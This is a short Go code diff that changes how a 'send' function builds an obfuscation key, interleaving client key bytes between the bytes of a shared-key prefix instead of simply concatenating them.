@@ -1080,11 +1080,27 @@ func send() { //发送头部信息
 		if sharedLen >= 6 {
 			last6 := sharedKey[sharedLen-6:]
 			prefix := sharedKey[:sharedLen-6]
-			newKey := make([]byte, len(prefix)+len(clientKey))
-			for i, v := range prefix {
-				newKey[i] = byte(v)
+			pLen := len(prefix)
+			cLen := len(clientKey)
+			newKey := make([]byte, 0, pLen+cLen)
+			base := cLen / (pLen + 1)
+			rem := cLen % (pLen + 1)
+			ci := 0
+			for i := 0; i < pLen; i++ {
+				segLen := base
+				if i < rem {
+					segLen++
+				}
+				for j := 0; j < segLen && ci < cLen; j++ {
+					newKey = append(newKey, clientKey[ci])
+					ci++
+				}
+				newKey = append(newKey, byte(prefix[i]))
 			}
-			copy(newKey[len(prefix):], clientKey)
+			for ci < cLen {
+				newKey = append(newKey, clientKey[ci])
+				ci++
+			}
 			obfKey = newKey
 			obfConst = ObfConst{A: byte(last6[0]),B: byte(last6[1]),C: byte(last6[2]),D: byte(last6[3]),E: byte(last6[4]),F: byte(last6[5]),}
 		} else {
